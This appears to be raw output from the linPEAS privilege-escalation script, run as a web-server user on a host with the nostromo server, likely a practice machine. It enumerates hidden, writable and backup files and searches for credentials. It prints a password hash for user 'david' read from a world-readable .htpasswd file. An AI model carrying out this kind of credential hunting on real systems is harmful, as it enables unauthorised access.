[1;33m[+] [1;32mWeb files?(output limit)
[0m
[1;33m[+] [1;32mReadable hidden interesting files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
[0m-rw-r--r-- 1 [1;31mroot[0m [1;31mroot[0m 1994 Apr 18  2019 /etc/bash.bashrc
-rw-r--r-- 1 [1;31mroot[0m [1;31mroot[0m 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 [1;31mroot[0m [1;31mroot[0m 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 [1;31mroot[0m [1;31mroot[0m 570 Jan 31  2010 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 [1;31mroot[0m [1;31mroot[0m 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 [1;31mroot[0m [1;31mroot[0m 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 [1;31mroot[0m bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
[1;32mReading /var/nostromo/conf/.htpasswd
[0m[1;31mdavid:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/[0m

-rw-r--r-- 1 [1;31mroot[0m bin 498 Oct 25  2019 /var/nostromo/conf/nhttpd.conf
[1;32mChecking for creds on /var/nostromo/conf/nhttpd.conf
[0m[1;31mhtaccess		.htaccess[0m
[1;31mhtpasswd		/var/nostromo/conf/.htpasswd[0m


[1;33m[+] [1;32mAll hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
[0m-rw-r--r-- 1 root root 0 Apr 11 17:53 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 102 Jun 23  2019 /etc/cron.d/.placeholder
-rw-r--r-- 1 root root 102 Jun 23  2019 /etc/cron.monthly/.placeholder
-rw-r--r-- 1 root root 102 Jun 23  2019 /etc/cron.daily/.placeholder
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw------- 1 root root 0 Oct 25  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 102 Jun 23  2019 /etc/cron.weekly/.placeholder
-rw-r--r-- 1 root root 102 Jun 23  2019 /etc/cron.hourly/.placeholder
-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd

[1;33m[+] [1;32mReadable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
[0m-rw-r--r-- 1 root root 40960 Nov 12  2019 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 7665 Oct 25  2019 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 186 Oct 25  2019 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 100 Oct 25  2019 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 314222 Oct 25  2019 /var/backups/dpkg.status.0

[1;33m[+] [1;32mInteresting writable files owned by me or writable by everyone (not in Home) (max 500)
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
[0m/dev/mqueue
/dev/shm
/dev/shm/lin_www.out
/dev/shm/linpeas[1;31m.sh[0m
/run/lock
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
/var/nostromo/logs
/var/nostromo/logs/nhttpd.pid
/var/tmp

[1;33m[+] [1;32mInteresting GROUP writable files (not in Home) (max 500)
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
[0m  Group [1;32mwww-data:
[0m

[1;33m[+] [1;32mSearching passwords in config PHP files
[0m
[1;33m[+] [1;32mChecking for TTY (sudo/su) passwords in audit logs
[0m
[1;33m[+] [1;32mFinding IPs inside logs (limit 70)
[0m
[1;33m[+] [1;32mFinding passwords inside logs (limit 70)
[0m
[1;33m[+] [1;32mFinding emails inside logs (limit 70)
[0m
[1;33m[+] [1;32mFinding *password* or *credential* files in home (limit 70)
[0m/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-console.service
/usr/lib/systemd/system/systemd-ask-[1;31mpassword[0m-wall.service

[1;33m[+] [1;32mFinding passwords inside key folders (limit 70) - only PHP files
[0m
[1;33m[+] [1;32mFinding passwords inside key folders (limit 70) - no PHP files
[0m/etc/pam.d/common-[1;31mpassw[0mord:[1;31mpassw[0mord	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/vmware-tools/messages/es/VGAuthLib.vmsg:auth.[1;31mpassw[0mord.invalid = "El nombre de usuario y la contraseña de '
/var/backups/dpkg.status.0:Depends: [1;31mpassw[0md, debconf (>= 0.5) | debconf-2.0

[1;33m[+] [1;32mFinding possible password variables inside key folders (limit 140)
[0m
[1;33m[+] [1;32mFinding possible password in config files
[0m[3m /etc/debconf.conf[0m
[1;31mpassw[0mords.
[1;31mpassw[0mord
[1;31mpassw[0mords.
[1;31mpassw[0mords
[1;31mpassw[0mord
[1;31mpassw[0mords.dat
[1;31mpassw[0mords and one for everything else.
[1;31mpassw[0mords
[1;31mpassw[0mord is really
[1;31mPassw[0md: secret
[3m /etc/adduser.conf[0m
[1;31mpassw[0md
[3m /etc/nsswitch.conf[0m
[1;31mpassw[0md:         files systemd
[3m /etc/reportbug.conf[0m
[1;31mpassw[0mord for SMTP
[1;31mpassw[0md XXX

[1;33m[+] [1;32mFinding 'username' string inside key folders (limit 70)
[0m/etc/vmware-caf/pme/install/caf-dbg.sh:   local [1;31musername[0m="$1"
/etc/vmware-caf/pme/scripts/setUpVgAuth:   echo "    subject: Subject that maps to the [1;31muserName[0m in the SAML [default: $subject]"
/etc/vmware-caf/pme/scripts/setUpVgAuth:   echo "    [1;31muserName[0m: The name of the user to be added [default: $[1;31muserName[0m]"
/etc/vmware-caf/pme/scripts/setUpVgAuth:   [1;31muserName[0m=$1
/etc/vmware-caf/pme/scripts/setUpVgAuth:if [ $[1;31muserName[0m != "" ]; then
/etc/vmware-caf/pme/scripts/setUpVgAuth:[1;31muserName[0m=""
/etc/vmware-caf/pme/scripts/tearDownVgAuth:   echo "    subject: Subject that maps to the [1;31muserName[0m in the SAML [default: $subject]"
/etc/vmware-caf/pme/scripts/tearDownVgAuth:   echo "    [1;31muserName[0m: The name of the user to be removed [default: $[1;31muserName[0m]"
/etc/vmware-caf/pme/scripts/tearDownVgAuth:   [1;31muserName[0m=$1
/etc/vmware-caf/pme/scripts/tearDownVgAuth:if [ $[1;31muserName[0m != "" ]; then
/etc/vmware-caf/pme/scripts/tearDownVgAuth:[1;31muserName[0m=""
/etc/vmware-caf/pme/scripts/vgAuth:			$vgAuthCli add --global --[1;31musername[0m=$[1;31musername[0m --file $cert --subject=$subject
/etc/vmware-caf/pme/scripts/vgAuth:			$vgAuthCli remove --[1;31musername[0m=$[1;31musername[0m --file $cert --subject=$subject
/etc/vmware-caf/pme/scripts/vgAuth:		$vgAuthCli list --[1;31musername[0m=$[1;31musername[0m
/etc/vmware-caf/pme/scripts/vgAuth:		userLineCnt=$($vgAuthCli list --[1;31musername[0m=$[1;31musername[0m | wc -l)
/etc/vmware-caf/pme/scripts/vgAuth:	echo "    [1;31mUsername[0m: The name of the user to add to the alias store [default: $[1;31musername[0m]"
/etc/vmware-caf/pme/scripts/vgAuth:	[1;31musername[0m=$2
/etc/vmware-caf/pme/scripts/vgAuth:[1;31musername[0m="testuser"
/etc/vmware-tools/messages/de/VGAuthCli.vmsg:addoptions.[1;31musername[0m = "Benutzer, dessen Zertifikatsspeicher hinzugefügt wird zu"
/etc/vmware-tools/messages/de/VGAuthCli.vmsg:cmdline.summary.[1;31musername[0m = "Benutzername"
/etc/vmware-tools/messages/de/VGAuthCli.vmsg:listmapped.[1;31musername[0m = "Benutzername"
/etc/vmware-tools/messages/de/VGAuthCli.vmsg:listoptions.[1;31musername[0m = "Benutzer, dessen Zertifikatsspeicher angefordert wird"
/etc/vmware-tools/messages/de/VGAuthCli.vmsg:removeoptions.[1;31musername[0m = "Benutzer, dessen Zertifikatsspeicher entfernt wird von"
/etc/vmware-tools/messages/en/VGAuthCli.vmsg:addoptions.[1;31musername[0m = "User whose certificate store is being added to"
/etc/vmware-tools/messages/en/VGAuthCli.vmsg:cmdline.summary.[1;31musername[0m = "[1;31musername[0m"
/etc/vmware-tools/messages/en/VGAuthCli.vmsg:listmapped.[1;31musername[0m = "[1;31mUsername[0m"
/etc/vmware-tools/messages/en/VGAuthCli.vmsg:listoptions.[1;31musername[0m = "User whose certificate store is being queried"
/etc/vmware-tools/messages/en/VGAuthCli.vmsg:removeoptions.[1;31musername[0m = "User whose certificate store is being removed from"
/etc/vmware-tools/messages/es/VGAuthCli.vmsg:addoptions.[1;31musername[0m = "El usuario cuyo almacén de certificados se está añadiendo a"
/etc/vmware-tools/messages/es/VGAuthCli.vmsg:cmdline.summary.[1;31musername[0m = "nombre de usuario"
/etc/vmware-tools/messages/es/VGAuthCli.vmsg:listmapped.[1;31musername[0m = "Nombre de usuario"
/etc/vmware-tools/messages/es/VGAuthCli.vmsg:listoptions.[1;31musername[0m = "El usuario cuyo almacén de certificados se está consultando"
/etc/vmware-tools/messages/es/VGAuthCli.vmsg:removeoptions.[1;31musername[0m = "El usuario cuyo almacén de certificados se va a eliminar de"
/etc/vmware-tools/messages/fr/VGAuthCli.vmsg:addoptions.[1;31musername[0m = "Utilisateur dont le magasin de certificats est ajouté à"
/etc/vmware-tools/messages/fr/VGAuthCli.vmsg:cmdline.summary.[1;31musername[0m = "nom d'utilisateur"
/etc/vmware-tools/messages/fr/VGAuthCli.vmsg:listmapped.[1;31musername[0m = "Nom d'utilisateur"
/etc/vmware-tools/messages/fr/VGAuthCli.vmsg:listoptions.[1;31musername[0m = "Utilisateur dont le magasin de certificats est demandé"
/etc/vmware-tools/messages/fr/VGAuthCli.vmsg:removeoptions.[1;31musername[0m = "Utilisateur pour lequel le magasin de certificats est supprimé"
/etc/vmware-tools/messages/it/VGAuthCli.vmsg:addoptions.[1;31musername[0m = "Utente a cui viene aggiunto l'archivio certificati"
/etc/vmware-tools/messages/it/VGAuthCli.vmsg:cmdline.summary.[1;31musername[0m = "nome utente"
/etc/vmware-tools/messages/it/VGAuthCli.vmsg:listmapped.[1;31musername[0m = "Nome utente"
/etc/vmware-tools/messages/it/VGAuthCli.vmsg:listoptions.[1;31musername[0m = "Utente il cui archivio certificati è oggetto di query"
/etc/vmware-tools/messages/it/VGAuthCli.vmsg:removeoptions.[1;31musername[0m = "Utente da cui viene rimosso l'archivio certificati"
/etc/vmware-tools/messages/ja/VGAuthCli.vmsg:addoptions.[1;31musername[0m = "証明書ストアが追加されているユーザー"
/etc/vmware-tools/messages/ja/VGAuthCli.vmsg:cmdline.summary.[1;31musername[0m = "ユーザー名"
/etc/vmware-tools/messages/ja/VGAuthCli.vmsg:listmapped.[1;31musername[0m = "ユーザー名"
/etc/vmware-tools/messages/ja/VGAuthCli.vmsg:listoptions.[1;31musername[0m = "証明書ストアが照会されているユーザー"
/etc/vmware-tools/messages/ja/VGAuthCli.vmsg:removeoptions.[1;31musername[0m = "次の場所から証明書ストアが削除されているユーザー"
/etc/vmware-tools/messages/ko/VGAuthCli.vmsg:addoptions.[1;31musername[0m = "인증서 저장소를 추가 중인 사용자"
/etc/vmware-tools/messages/ko/VGAuthCli.vmsg:cmdline.summary.[1;31musername[0m = "사용자 이름"
/etc/vmware-tools/messages/ko/VGAuthCli.vmsg:listmapped.[1;31musername[0m = "사용자 이름"
/etc/vmware-tools/messages/ko/VGAuthCli.vmsg:listoptions.[1;31musername[0m = "인증서 저장소를 쿼리 중인 사용자"
/etc/vmware-tools/messages/ko/VGAuthCli.vmsg:removeoptions.[1;31musername[0m = "인증서 저장소를 제거 중인 사용자"
/etc/vmware-tools/messages/zh_CN/VGAuthCli.vmsg:addoptions.[1;31musername[0m = "要在以下位置添加证书存储的用户"
/etc/vmware-tools/messages/zh_CN/VGAuthCli.vmsg:cmdline.summary.[1;31musername[0m = "用户名"
/etc/vmware-tools/messages/zh_CN/VGAuthCli.vmsg:listmapped.[1;31musername[0m = "用户名"
/etc/vmware-tools/messages/zh_CN/VGAuthCli.vmsg:listoptions.[1;31musername[0m = "要对其证书存储进行查询的用户"
/etc/vmware-tools/messages/zh_CN/VGAuthCli.vmsg:removeoptions.[1;31musername[0m = "要从以下位置移除其证书存储的用户"
/etc/vmware-tools/messages/zh_TW/VGAuthCli.vmsg:addoptions.[1;31musername[0m = "正將其憑證存放區新增至以下項目的使用者"
/etc/vmware-tools/messages/zh_TW/VGAuthCli.vmsg:cmdline.summary.[1;31musername[0m = "使用者名稱"
/etc/vmware-tools/messages/zh_TW/VGAuthCli.vmsg:listmapped.[1;31musername[0m = "使用者名稱"
/etc/vmware-tools/messages/zh_TW/VGAuthCli.vmsg:listoptions.[1;31musername[0m = "正在查詢其憑證存放區的使用者"
/etc/vmware-tools/messages/zh_TW/VGAuthCli.vmsg:removeoptions.[1;31musername[0m = "正從以下項目移除其憑證存放區的使用者"

[1;33m[+] [1;32mSearching specific hashes inside files - less false positives (limit 70)
[0m
